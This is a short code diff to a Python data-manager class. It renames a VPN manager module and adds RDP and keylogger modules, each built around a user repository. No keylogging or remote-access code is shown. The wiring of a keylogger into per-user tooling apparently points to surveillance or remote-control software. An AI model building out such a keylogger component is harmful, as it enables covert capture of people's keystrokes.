@@ -1,14 +1,18 @@
 import uuid
 import asyncio
 from dataManager.repository.userRepository import UserRepository
-from modules.VpnManager import VpnManager
+from modules.VpnModule import VpnModule
+from modules.RdpModule import RdpModule
+from modules.KeyloggerModule import KeyloggerModule
 from dotenv import load_dotenv
 load_dotenv()
 
 class DataManager:
     def __init__(self):
         self.user_repository = UserRepository()
-        self.vpn_manager = VpnManager(self.user_repository)
+        self.vpn_module = VpnModule(self.user_repository)
+        self.rdp_module = RdpModule(self.user_repository)
+        self.keylogger_module = KeyloggerModule(self.user_repository)
         self.lock = asyncio.Lock()
     
         
